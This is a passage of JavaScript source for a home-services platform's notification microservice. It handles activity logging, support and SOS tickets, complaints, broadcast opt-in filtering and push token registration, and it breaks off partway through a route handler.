// HomeHelp Notification Service
// -----------------------------
// The cross-cutting comms + audit service on its own Postgres. It owns:
//   activity_log  – unified who-did-what-when feed, fed by the Redis event bus
//   tickets       – customer support tickets (+ admin replies)
//   complaints    – admin complaints board
//   broadcasts    – admin announcements / push
// It CONSUMES every service's `activity` / `customer.login` / `admin.action` events and records
// them, so the admin Activity Monitor and booking timeline work without any service calling it.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, nowIso, makeAdminAuth, requirePerm, requireAnyPerm, internalOnly, subscribeEvents, tryGet, publishEvent, publishRealtime, sendPush, inScope, internalPost,
} from '@homehelp/shared'
// Imported directly, not via the shared index: they carry the jsonwebtoken dep.
import { makeCustomerAuth } from '@homehelp/shared/customer-auth.js'
import { assertJwtSecret, tokenSubject } from '@homehelp/shared/jwt.js'

assertJwtSecret('notification') // refuse to boot without a signing secret rather than trust forgeable tokens

const PORT = Number(process.env.PORT || 4003)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5434/notification'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')
const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')

process.on('unhandledRejection', (e) => console.error('[notification] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)
const auth = makeCustomerAuth(AUTH_URL)

async function init() {
  await migrate(pool, [
    // Phones to push to: one row per app install (FCM registration token).
    `CREATE TABLE IF NOT EXISTS device_tokens (id SERIAL PRIMARY KEY, kind TEXT NOT NULL, owner_id INTEGER NOT NULL,
       token TEXT NOT NULL UNIQUE, platform TEXT, updated TIMESTAMPTZ DEFAULT now())`,
    `CREATE INDEX IF NOT EXISTS ix_device_owner ON device_tokens(kind, owner_id)`,
    // The customer's in-app inbox (broadcasts, offers, job updates). Workers' inbox lives in wallet.
    `CREATE TABLE IF NOT EXISTS customer_inbox (id SERIAL PRIMARY KEY, user_id INTEGER NOT NULL, type TEXT, title TEXT NOT NULL,
       body TEXT, booking_id INTEGER, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE INDEX IF NOT EXISTS ix_inbox_user ON customer_inbox(user_id, id DESC)`,
    `CREATE TABLE IF NOT EXISTS activity_log (
      id BIGSERIAL PRIMARY KEY, actor_type TEXT NOT NULL, actor_id BIGINT, actor_name TEXT,
      action TEXT NOT NULL, entity_type TEXT, entity_id TEXT, ref TEXT, detail TEXT, meta JSONB,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE INDEX IF NOT EXISTS idx_activity_entity ON activity_log(entity_type, entity_id)`,
    `CREATE INDEX IF NOT EXISTS idx_activity_actor ON activity_log(actor_type, actor_id)`,
    `CREATE INDEX IF NOT EXISTS idx_activity_action ON activity_log(action)`,
    `CREATE TABLE IF NOT EXISTS tickets (
      id SERIAL PRIMARY KEY, user_id INTEGER NOT NULL, category TEXT NOT NULL, message TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'Open', response TEXT, ref TEXT, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS complaints (
      id SERIAL PRIMARY KEY, ref TEXT NOT NULL, customer TEXT NOT NULL, against TEXT, booking_ref TEXT,
      category TEXT NOT NULL, message TEXT NOT NULL, priority TEXT NOT NULL DEFAULT 'medium',
      status TEXT NOT NULL DEFAULT 'open', created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS broadcasts (
      id SERIAL PRIMARY KEY, type TEXT NOT NULL DEFAULT 'announcement', title TEXT NOT NULL, body TEXT,
      audience TEXT NOT NULL DEFAULT 'all', channel TEXT NOT NULL DEFAULT 'in-app', sent INTEGER NOT NULL DEFAULT 0,
      admin TEXT, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    // Delivery accounting: how many opted-out recipients were skipped, and whether this was promotional.
    `ALTER TABLE broadcasts ADD COLUMN IF NOT EXISTS suppressed INTEGER NOT NULL DEFAULT 0`,
    `ALTER TABLE broadcasts ADD COLUMN IF NOT EXISTS promotional BOOLEAN NOT NULL DEFAULT false`,
    // Module 14 (Support): richer ticket fields + escalation.
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS subcategory TEXT`,
    // Expert (worker) tickets share the admin queue: requester='worker' + worker_id (user_id 0).
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS requester TEXT NOT NULL DEFAULT 'customer'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS worker_id INTEGER`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS worker_ticket_id INTEGER`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS subject TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS escalated BOOLEAN NOT NULL DEFAULT false`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS escalate_reason TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS escalate_contact TEXT`,
    // Booking-linked complaints (admin Support & Complaints tab): the ticket ties to a booking and
    // carries priority/severity/impact + lifecycle timestamps for the status stepper.
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS booking_id INTEGER`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS booking_ref TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS priority TEXT NOT NULL DEFAULT 'medium'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS severity TEXT NOT NULL DEFAULT 'medium'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS impact TEXT NOT NULL DEFAULT 'low'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS source TEXT NOT NULL DEFAULT 'in-app'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS raised_by TEXT NOT NULL DEFAULT 'Customer'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS acknowledged_at TIMESTAMPTZ`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS review_at TIMESTAMPTZ`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS resolved_at TIMESTAMPTZ`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS resolved_by TEXT`,
    // SOS incidents are Safety tickets; these carry where it happened and who is responding.
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS sos_kind TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS sos_lat DOUBLE PRECISION`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS sos_lng DOUBLE PRECISION`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS acknowledged_by TEXT`,
    `CREATE TABLE IF NOT EXISTS ticket_messages (
      id SERIAL PRIMARY KEY, ticket_id INTEGER NOT NULL,
      sender_type TEXT NOT NULL,            -- customer | worker | admin
      sender_name TEXT NOT NULL DEFAULT '',
      body TEXT NOT NULL, source TEXT NOT NULL DEFAULT 'in-app',
      internal BOOLEAN NOT NULL DEFAULT false,   -- true = admin-only internal note
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE INDEX IF NOT EXISTS ix_tmsg_ticket ON ticket_messages(ticket_id)`,
    `CREATE INDEX IF NOT EXISTS ix_tickets_booking ON tickets(booking_id)`,
  ])
  console.log('[notification] Postgres ready (activity_log, tickets, complaints, broadcasts)')
}

async function logEvent(e) {
  await pool.query(
    `INSERT INTO activity_log (actor_type,actor_id,actor_name,action,entity_type,entity_id,ref,detail,meta,created)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9::jsonb, COALESCE($10::timestamptz, now()))`,
    [e.actorType || 'system', e.actorId != null ? Number(e.actorId) : null, e.actorName || null,
      e.action || 'event', e.entityType || null, e.entityId != null ? String(e.entityId) : null,
      e.ref || null, e.detail || null, e.meta != null ? JSON.stringify(e.meta) : null, e.created || null])
}

async function listActivity(query) {
  const { actorType, action, entityType, entityId, q, since } = query
  const limit = Math.min(500, Number(query.limit) || 100), offset = Number(query.offset) || 0
  const where = [], params = []
  const add = (sql, val) => { params.push(val); where.push(sql.replace('?', `$${params.length}`)) }
  if (actorType && actorType !== 'all') add('actor_type = ?', actorType)
  if (action && action !== 'all') { params.push(action); where.push(`(action = $${params.length} OR action LIKE $${params.length} || '%')`) }
  if (entityType && entityType !== 'all') add('entity_type = ?', entityType)
  if (entityId != null && entityId !== '') add('entity_id = ?', String(entityId))
  if (since) add('created >= ?::timestamptz', since)
  if (q) { params.push(`%${String(q).toLowerCase()}%`); const i = params.length; where.push(`(lower(actor_name) LIKE $${i} OR lower(detail) LIKE $${i} OR lower(ref) LIKE $${i} OR lower(action) LIKE $${i})`) }
  const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
  const total = (await pool.query(`SELECT COUNT(*)::int n FROM activity_log ${clause}`, params)).rows[0].n
  const items = (await pool.query(`SELECT * FROM activity_log ${clause} ORDER BY id DESC LIMIT ${limit} OFFSET ${offset}`, params)).rows
  return { total, items }
}
// Counts for one period (days=0 → all time), so the per-source counts always add up to the total.
async function statsActivity(days) {
  const d = days === undefined || days === '' ? 7 : Number(days) || 0
  const since = d > 0 ? new Date(Date.now() - d * 864e5).toISOString() : '1970-01-01T00:00:00Z'
  const byActor = (await pool.query('SELECT actor_type, COUNT(*)::int n FROM activity_log WHERE created>=$1 GROUP BY actor_type', [since])).rows
  const byAction = (await pool.query('SELECT action, COUNT(*)::int n FROM activity_log WHERE created>=$1 GROUP BY action ORDER BY n DESC LIMIT 12', [since])).rows
  const total = byActor.reduce((a, r) => a + r.n, 0)
  return { total, since, byActor, byAction }
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'notification', ok: true }))

/* ---------- activity (admin monitor) ---------- */
const listRoute = async (req, res) => { try { res.json(await listActivity(req.query)) } catch (e) { res.status(500).json({ error: e.message }) } }
const statsRoute = async (req, res) => { try { res.json(await statsActivity(req.query.days)) } catch (e) { res.status(500).json({ error: e.message }) } }
app.get('/api/admin/activity', adminAuth, requireAnyPerm('activity.view'), listRoute)
app.get('/api/admin/activity/stats', adminAuth, requireAnyPerm('activity.view'), statsRoute)
app.post('/internal/events', internalOnly, async (req, res) => { try { await logEvent(req.body || {}); res.json({ ok: true }) } catch (e) { res.status(500).json({ error: e.message }) } })
app.get('/internal/list', internalOnly, listRoute)
app.get('/internal/timeline/:bookingId', internalOnly, async (req, res) => {
  const rows = (await pool.query("SELECT * FROM activity_log WHERE entity_type='booking' AND entity_id=$1 ORDER BY id ASC", [String(req.params.bookingId)])).rows
  res.json(rows)
})

/* ---------- support tickets ---------- */
app.get('/api/tickets', auth, async (req, res) => res.json((await pool.query('SELECT * FROM tickets WHERE user_id=$1 ORDER BY id DESC', [req.user.id])).rows))
app.post('/api/tickets', auth, async (req, res) => {
  if (!req.body?.message) return res.status(400).json({ error: 'Describe your issue' })
  const ref = '#TK' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query(
    'INSERT INTO tickets (user_id,category,subcategory,subject,message,status,ref) VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *',
    [req.user.id, req.body.category || 'General', req.body.subcategory || null, req.body.subject || null, req.body.message, 'Open', ref])
  await logEvent({ actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'support.ticket', entityType: 'ticket', entityId: rows[0].id, ref, detail: `Raised ticket: ${req.body.category || 'General'}` })
  res.status(201).json(rows[0])
})

// Escalate a ticket to the senior team — records the reason + preferred contact.
app.post('/api/tickets/:id/escalate', auth, async (req, res) => {
  const id = Number(req.params.id)
  const own = await pool.query('SELECT id FROM tickets WHERE id=$1 AND user_id=$2', [id, req.user.id])
  if (!own.rowCount) return res.status(404).json({ error: 'Ticket not found' })
  const { rows } = await pool.query(
    "UPDATE tickets SET escalated=true, status='Escalated', escalate_reason=$1, escalate_contact=$2 WHERE id=$3 RETURNING *",
    [String(req.body?.reason || '').slice(0, 500) || null, String(req.body?.contact || 'call').slice(0, 20), id])
  await logEvent({ actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'support.escalate', entityType: 'ticket', entityId: id, ref: rows[0].ref, detail: 'Escalated ticket' })
  res.json(rows[0])
})
/* Worker tickets: the worker service mirrors each one here so ops works one queue. */
app.post('/api/internal/sos-ticket', internalOnly, async (req, res) => {
  const b = req.body || {}
  const ref = '#SOS' + Math.floor(1000 + Math.random() * 8999)
  const worker = b.kind === 'worker'
  const { rows } = await pool.query(
    `INSERT INTO tickets (user_id,category,subject,message,status,ref,priority,escalated,booking_id,booking_ref,requester,worker_id,sos_kind,sos_lat,sos_lng)
     VALUES ($1,'Safety',$2,$3,'Open',$4,'urgent',true,$5,$6,$7,$8,$9,$10,$11) RETURNING *`,
    [worker ? 0 : Number(b.userId) || 0, worker ? 'Expert SOS' : 'SOS during service', b.message || 'SOS', ref, b.bookingId || null, b.bookingRef || null,
      worker ? 'worker' : 'customer', worker ? Number(b.workerId) : null, worker ? 'worker' : 'customer',
      Number.isFinite(Number(b.lat)) && b.lat != null ? Number(b.lat) : null, Number.isFinite(Number(b.lng)) && b.lng != null ? Number(b.lng) : null])
  res.json(rows[0])
})
app.post('/api/internal/worker-tickets', internalOnly, async (req, res) => {
  const b = req.body || {}
  const ref = '#TW' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query(
    `INSERT INTO tickets (user_id,category,subject,message,status,ref,requester,worker_id,worker_ticket_id,priority)
     VALUES (0,$1,$2,$3,'Open',$4,'worker',$5,$6,$7) RETURNING *`,
    [b.category || 'Expert support', b.subject || null, b.message || b.subject || 'Support request', ref, Number(b.workerId), Number(b.localId) || null, b.priority || 'medium'])
  res.json(rows[0])
})
app.get('/api/internal/worker-tickets/:wid', internalOnly, async (req, res) => {
  res.json((await pool.query("SELECT id, worker_ticket_id, status, response, ref FROM tickets WHERE requester='worker' AND worker_id=$1", [Number(req.params.wid)])).rows)
})

/* Data scope for tickets: a booking-linked ticket follows the booking's zone; a worker's follows the
 * worker's zone/city; any other customer ticket follows the customer's city. */
async function ticketScopeFilter(req, rows) {
  const scope = req.admin?.scope
  if (!scope || scope.type === 'all') return rows
  const [bookings, wres, customers] = await Promise.all([
    tryGet(BOOKING_URL, '/api/internal/bookings', []),
    tryGet(WORKER_URL, '/internal/workers', { workers: [] }),
    tryGet(AUTH_URL, '/api/internal/customers', []),
  ])
  const bz = new Map((bookings || []).map((b) => [b.id, b]))
  const wz = new Map((wres.workers || []).map((w) => [w.id, w]))
  const cc = new Map((customers || []).map((c) => [c.id, c.city]))
  return rows.filter((t) => {
    if (t.booking_id && bz.has(t.booking_id)) { const b = bz.get(t.booking_id); return inScope(scope, { zoneId: b.zone_id, storeId: b.store_id }) }
    if (t.requester === 'worker') { const w = wz.get(t.worker_id); return !!w && inScope(scope, { zoneId: w.zone_id, city: w.city, storeId: w.store_id }) }
    return inScope({ ...scope, zoneIds: [] }, { city: cc.get(t.user_id) || null })
  })
}
/* ---------- SOS incidents (the safety desk / hub-manager queue) ----------
   Every SOS — the expert's button, the volume buttons, an unanswered safety check, or a customer's
   SOS — is an urgent Safety ticket. Scoped like any ticket, so a hub manager sees their hub's. */
const sosDto = (t, names) => ({
  id: t.id, ref: t.ref, kind: t.sos_kind || (t.requester === 'worker' ? 'worker' : 'customer'), status: t.status,
  who: t.requester === 'worker' ? (names.w.get(t.worker_id) || `Expert #${t.worker_id}`) : (names.c.get(t.user_id) || `Customer #${t.user_id}`),
  phone: t.requester === 'worker' ? (names.wp.get(t.worker_id) || '') : (names.cp.get(t.user_id) || ''),
  workerId: t.worker_id, userId: t.user_id, bookingId: t.booking_id, bookingRef: t.booking_ref, message: t.message,
  lat: t.sos_lat, lng: t.sos_lng, created: t.created, acknowledgedAt: t.acknowledged_at, acknowledgedBy: t.acknowledged_by,
  resolvedAt: t.resolved_at, resolvedBy: t.resolved_by, response: t.response,
})
async function sosNames(rows) {
  const [wres, customers] = await Promise.all([
    rows.some((t) => t.requester === 'worker') ? tryGet(WORKER_URL, '/internal/workers', { workers: [] }) : { workers: [] },
    rows.some((t) => t.requester !== 'worker') ? tryGet(AUTH_URL, '/api/internal/customers', []) : [],
  ])
  return {
    w: new Map((wres.workers || []).map((w) => [w.id, w.name])), wp: new Map((wres.workers || []).map((w) => [w.id, w.phone])),
    c: new Map((customers || []).map((c) => [c.id, c.name])), cp: new Map((customers || []).map((c) => [c.id, c.phone])),
  }
}
app.get('/api/admin/sos', adminAuth, requirePerm('safety.view'), async (req, res) => {
  const all = String(req.query.status || 'open') === 'all'
  const rows = await ticketScopeFilter(req, (await pool.query(
    `SELECT * FROM tickets WHERE category='Safety' ${all ? '' : "AND lower(coalesce(status,'')) NOT IN ('resolved','closed')"} ORDER BY id DESC LIMIT 200`)).rows)
  const names = await sosNames(rows)
  res.json(rows.map((t) => sosDto(t, names)))
})
async function sosInScope(req, res) {
  const t = (await pool.query("SELECT * FROM tickets WHERE id=$1 AND category='Safety'", [Number(req.params.id)])).rows[0]
  if (!t || !(await ticketScopeFilter(req, [t])).length) { res.status(404).json({ error: 'Not found' }); return null }
  return t
}
app.post('/api/admin/sos/:id/ack', adminAuth, requirePerm('safety.respond'), async (req, res) => {
  const t = await sosInScope(req, res); if (!t) return
  const who = req.admin?.name || req.admin?.email || 'Admin'
  if (['Resolved', 'Closed'].includes(t.status)) return res.status(409).json({ error: 'Already resolved' })
  const { rows } = await pool.query("UPDATE tickets SET status='Acknowledged', acknowledged_at=COALESCE(acknowledged_at, now()), acknowledged_by=COALESCE(acknowledged_by, $1) WHERE id=$2 RETURNING *", [who, t.id])
  await logEvent({ actorType: 'admin', actorId: req.admin?.id, actorName: who, action: 'sos.ack', entityType: 'ticket', entityId: t.id, ref: t.ref, detail: `${who} is responding to ${t.ref}` })
  publishRealtime(REDIS_URL, 'admin', 'sos:update', { id: t.id, status: 'Acknowledged', by: who })
  res.json(sosDto(rows[0], await sosNames(rows)))
})
app.post('/api/admin/sos/:id/resolve', adminAuth, requirePerm('safety.respond'), async (req, res) => {
  const t = await sosInScope(req, res); if (!t) return
  const who = req.admin?.name || req.admin?.email || 'Admin'
  const note = String(req.body?.note || '').trim().slice(0, 500)
  if (!note) return res.status(400).json({ error: 'Say what happened before closing the SOS.' })
  const { rows } = await pool.query(
    "UPDATE tickets SET status='Resolved', response=$1, resolved_at=now(), resolved_by=$2, acknowledged_at=COALESCE(acknowledged_at, now()), acknowledged_by=COALESCE(acknowledged_by, $2) WHERE id=$3 RETURNING *",
    [note, who, t.id])
  await logEvent({ actorType: 'admin', actorId: req.admin?.id, actorName: who, action: 'sos.resolve', entityType: 'ticket', entityId: t.id, ref: t.ref, detail: `${who} closed ${t.ref}: ${note}` })
  publishRealtime(REDIS_URL, 'admin', 'sos:update', { id: t.id, status: 'Resolved', by: who })
  res.json(sosDto(rows[0], await sosNames(rows)))
})
app.get('/api/admin/tickets', adminAuth, requireAnyPerm('tickets.view'), async (req, res) => {
  const rows = await ticketScopeFilter(req, (await pool.query('SELECT * FROM tickets ORDER BY id DESC')).rows)
  // tickets store only user_id; resolve the customer (or expert) display name for the admin table/search/CSV.
  const customers = await tryGet(AUTH_URL, '/api/internal/customers', [])
  const nameById = new Map((customers || []).map((c) => [c.id, c.name]))
  const wres = rows.some((t) => t.requester === 'worker') ? await tryGet(WORKER_URL, '/internal/workers', { workers: [] }) : { workers: [] }
  const wName = new Map((wres.workers || []).map((w) => [w.id, w.name]))
  res.json(rows.map((t) => ({ ...t, customer: t.requester === 'worker' ? `Expert: ${wName.get(t.worker_id) || '#' + t.worker_id}` : (nameById.get(t.user_id) || `Customer #${t.user_id}`) })))
})
// Booking-scoped tickets + KPI counts for the Support & Complaints tab. Defined before /:id so
// "booking" isn't captured as an id.
app.get('/api/admin/tickets/booking/:bookingId', adminAuth, requireAnyPerm('tickets.view', 'bookings.view'), async (req, res) => {
  const rows = (await pool.query('SELECT * FROM tickets WHERE booking_id=$1 ORDER BY id DESC', [Number(req.params.bookingId)])).rows
  const counts = { total: rows.length, open: 0, resolved: 0, reopened: 0, escalated: 0 }
  for (const t of rows) {
    const s = (t.status || '').toLowerCase()
    if (s === 'resolved' || s === 'closed') counts.resolved++
    else if (s === 'reopened') counts.reopened++
    else counts.open++
    if (t.escalated) counts.escalated++
  }
  res.json({ tickets: rows, counts })
})
// Unresolved counts for the admin bell badge. This service owns both tables, so it counts them
// here rather than shipping every row to the admin service just to length() it.
// "Unresolved" = anything not resolved/closed, matching how the Support tab buckets statuses.
app.get('/api/internal/alert-counts', internalOnly, async (_q, res) => {
  const openish = "lower(coalesce(status,'')) NOT IN ('resolved','closed')"
  const [t, c] = await Promise.all([
    pool.query(`SELECT count(*)::int n FROM tickets WHERE ${openish}`),
    pool.query(`SELECT count(*)::int n FROM complaints WHERE ${openish}`),
  ])
  res.json({ tickets: t.rows[0].n, complaints: c.rows[0].n })
})
// A customer's tickets (for the admin customer-profile Support tab).
app.get('/api/internal/customers/:id/tickets', internalOnly, async (req, res) => {
  const rows = (await pool.query('SELECT * FROM tickets WHERE user_id=$1 ORDER BY id DESC', [Number(req.params.id)])).rows
  res.json(rows)
})
app.use('/api/admin/tickets/:id', adminAuth, async (req, res, next) => {
  if (!/^\d+$/.test(req.params.id)) return next()
  const t = (await pool.query('SELECT * FROM tickets WHERE id=$1', [Number(req.params.id)])).rows[0]
  if (t && !(await ticketScopeFilter(req, [t])).length) return res.status(404).json({ error: 'Not found' })
  next()
})
app.get('/api/admin/tickets/:id', adminAuth, requireAnyPerm('tickets.view'), async (req, res) => {
  const id = Number(req.params.id)
  const t = (await pool.query('SELECT * FROM tickets WHERE id=$1', [id])).rows[0]
  if (!t) return res.status(404).json({ error: 'Not found' })
  const msgs = (await pool.query('SELECT * FROM ticket_messages WHERE ticket_id=$1 ORDER BY id', [id])).rows
  res.json({ ...t, messages: msgs.filter((m) => !m.internal), notes: msgs.filter((m) => m.internal) })
})
app.post('/api/admin/tickets/:id/messages', adminAuth, requirePerm('tickets.resolve'), async (req, res) => {
  const id = Number(req.params.id), b = req.body || {}
  if (!b.body || !String(b.body).trim()) return res.status(400).json({ error: 'Message is required' })
  const internal = !!b.internal
  const { rows } = await pool.query(
    'INSERT INTO ticket_messages (ticket_id,sender_type,sender_name,body,source,internal) VALUES ($1,$2,$3,$4,$5,$6) RETURNING *',
    [id, internal ? 'admin' : (b.senderType || 'admin'), b.senderName || req.admin?.name || 'Admin', String(b.body).trim(), b.source || 'admin', internal])
  res.status(201).json(rows[0])
})
app.patch('/api/admin/tickets/:id', adminAuth, requirePerm('tickets.resolve'), async (req, res) => {
  const b = req.body || {}, id = Number(req.params.id)
  const cur = (await pool.query('SELECT * FROM tickets WHERE id=$1', [id])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Not found' })
  const status = b.status ?? cur.status
  const now = nowIso()
  const done = ['Resolved', 'Closed'].includes(status)
  const ack = cur.acknowledged_at || (['Acknowledged', 'Under Review', 'Resolved', 'Closed'].includes(status) ? now : null)
  const rev = cur.review_at || (['Under Review', 'Resolved', 'Closed'].includes(status) ? now : null)
  await pool.query(
    `UPDATE tickets SET status=$1, priority=$2, response=$3, escalated=$4, acknowledged_at=$5, review_at=$6,
       resolved_at=$7, resolved_by=$8 WHERE id=$9`,
    [status, b.priority ?? cur.priority, b.response ?? cur.response, b.escalated ?? cur.escalated, ack, rev,
      done ? (cur.resolved_at || now) : cur.resolved_at, done ? (cur.resolved_by || req.admin?.name || 'Admin') : cur.resolved_by, id])
  res.json((await pool.query('SELECT * FROM tickets WHERE id=$1', [id])).rows[0])
})
// Admin-raised complaint tied to a booking.
app.post('/api/admin/tickets', adminAuth, requirePerm('complaints.resolve'), async (req, res) => {
  const b = req.body || {}
  const ref = '#SUP-' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query(
    `INSERT INTO tickets (user_id,category,subcategory,subject,message,status,ref,booking_id,booking_ref,priority,severity,impact,source,raised_by,acknowledged_at)
     VALUES ($1,$2,$3,$4,$5,'Open',$6,$7,$8,$9,$10,$11,$12,$13,now()) RETURNING *`,
    [b.userId || 0, b.category || 'General', b.subcategory || '', b.subject || b.category || 'Complaint', b.message || '', ref,
      b.bookingId || null, b.bookingRef || '', b.priority || 'medium', b.severity || 'medium', b.impact || 'low', b.source || 'admin', b.raisedBy || 'Admin'])
  if (b.message) await pool.query('INSERT INTO ticket_messages (ticket_id,sender_type,sender_name,body,source) VALUES ($1,$2,$3,$4,$5)',
    [rows[0].id, 'admin', req.admin?.name || 'Admin', b.message, 'admin'])
  res.status(201).json(rows[0])
})

/* ---------- complaints ---------- */
app.get('/api/admin/complaints', adminAuth, requireAnyPerm('complaints.view'), async (req, res) => {
  let rows = (await pool.query('SELECT * FROM complaints ORDER BY id DESC')).rows
  if (req.query.status && req.query.status !== 'all') rows = rows.filter((c) => c.status === req.query.status)
  if (req.query.priority && req.query.priority !== 'all') rows = rows.filter((c) => c.priority === req.query.priority)
  res.json(rows)
})
app.post('/api/admin/complaints', adminAuth, requirePerm('complaints.resolve'), async (req, res) => {
  const c = req.body || {}
  const ref = '#CMP' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query('INSERT INTO complaints (ref,customer,against,booking_ref,category,message,priority,status) VALUES ($1,$2,$3,$4,$5,$6,$7,$8) RETURNING *',
    [ref, c.customer || 'Customer', c.against || null, c.booking_ref || null, c.category || 'General', c.message || '', c.priority || 'medium', 'open'])
  res.status(201).json(rows[0])
})
app.patch('/api/admin/complaints/:id', adminAuth, requirePerm('complaints.resolve'), async (req, res) => {
  const cur = (await pool.query('SELECT * FROM complaints WHERE id=$1', [Number(req.params.id)])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Not found' })
  await pool.query('UPDATE complaints SET status=$1, priority=$2 WHERE id=$3', [req.body?.status ?? cur.status, req.body?.priority ?? cur.priority, cur.id])
  res.json((await pool.query('SELECT * FROM complaints WHERE id=$1', [cur.id])).rows[0])
})

/* ---------- broadcasts / admin notifications ---------- */
// A broadcast is promotional (marketing) rather than transactional if its type says so or it's flagged.
const PROMO_TYPES = ['promo', 'promos', 'promotion', 'promotions', 'promotional', 'offer', 'offers', 'marketing', 'coupon']
// Which per-customer opt-in flag governs each delivery channel.
const CHANNEL_PREF = { whatsapp: 'whatsapp', sms: 'sms', email: 'email', push: 'push', 'in-app': 'push' }
// Resolve who actually receives a broadcast. Customer audiences honor each customer's opt-in:
// promotional messages skip comm_promo=false, and any message skips a customer who disabled the target
// channel. Worker audiences go to every active worker — workers have no per-channel/marketing opt-in
// yet, so nothing is suppressed. Returns the real send count and how many were suppressed.
async function resolveRecipients(b) {
  const isPromo = b.promotional === true || PROMO_TYPES.includes(String(b.type || '').toLowerCase())
  const audience = String(b.audience || 'all').toLowerCase()
  const chanPref = CHANNEL_PREF[String(b.channel || 'in-app').toLowerCase()] || null
  // Apply a recipient's opt-in: promotional messages skip comm_promo=false; every message skips the
  // channel the recipient disabled. Shared by customers and workers (both expose the same `comm` shape).
  const optIn = (list) => {
    let suppressed = 0
    const kept = list.filter((r) => {
      const comm = r.comm || {}
      if (isPromo && comm.promo === false) { suppressed++; return false }
      if (chanPref && comm[chanPref] === false) { suppressed++; return false }
      return true
    })
    return { kept, suppressed }
  }
  if (audience.includes('worker')) {
    // Worker roster + status come from the worker service; their comm opt-in is owned by the admin
    // service (kept off the worker record). Default everyone to all-on when they have no stored row.
    const [wr, commMap] = await Promise.all([
      tryGet(WORKER_URL, '/internal/workers', { workers: [] }),
      tryGet(ADMIN_URL, '/internal/worker-comm', {}),
    ])
    const active = (wr.workers || [])
      .filter((w) => (w.status || 'active') === 'active')
      .map((w) => ({ ...w, comm: commMap[w.id] || { whatsapp: true, sms: true, email: true, push: true, promo: true } }))
    const { kept, suppressed } = optIn(active)
    return { isPromo, sent: kept.length, suppressed, recipientIds: kept.map((w) => w.id), audienceKind: 'workers' }
  }
  const customers = await tryGet(AUTH_URL, '/api/internal/customers', [])
  const active = customers.filter((c) => (c.status || 'active') === 'active')
  const { kept, suppressed } = optIn(active)
  return { isPromo, sent: kept.length, suppressed, recipientIds: kept.map((c) => c.id), audienceKind: 'customers' }
}

/* ---------- push: device registration + delivery ---------- */
// Either app registers its FCM token after sign-in; the audience of the bearer token says whose it is.
function whoIs(req) {
  const c = tokenSubject(req.headers.authorization, 'customer')
  if (Number.isFinite(c)) return { kind: 'customer', id: c }
  const w = tokenSubject(req.headers.authorization, 'worker')
  if (Number.isFinite(w)) return { kind: 'worker', id: w }
  return null
}
app.post('/api/push/register', async (req, res) => {
  const who = whoIs(req)
  if (!who) return res.status(401).json({ error: 'Not authenticated' })
  const token = String(req.body?.token || '').trim()
  if (token.length < 20) return res.status(400).json({ error: 'token required' })
  await pool.query(
    `INSERT INTO device_tokens (kind,owner_id,token,platform,updated) VALUES ($1,$2,$3,$4,now())
     ON CONFLICT (token) DO UPDATE SET kind=EXCLUDED.kind, owner_id=EXCLUDED.owner_id, platform=EXCLUDED.platform, updated=now()`,
    [who.kind, who.id, token, String(req.body?.platform || 'android').slice(0, 20)])
  res.json({ ok: true })
})
app.post('/api/push/unregister', async (req, res) => {
  const who = whoIs(req)
  if (!who) return res.status(401).json({ error: 'Not authenticated' })
